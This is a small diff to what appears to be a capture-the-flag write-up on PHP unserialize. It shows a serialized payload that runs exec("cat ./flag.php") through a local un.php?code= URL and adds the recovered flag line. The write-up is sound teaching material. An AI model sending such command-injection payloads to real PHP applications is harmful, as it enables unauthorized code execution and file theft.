@@ -44,3 +44,5 @@ s:28:"echo exec("cat ./flag.php");";
 http://127.0.0.1/un.php?code=s:28:"echo exec("cat ./flag.php");";
 
 ![](./get-flag.jpg)
+
+flag{Here_is_php_unserialize}
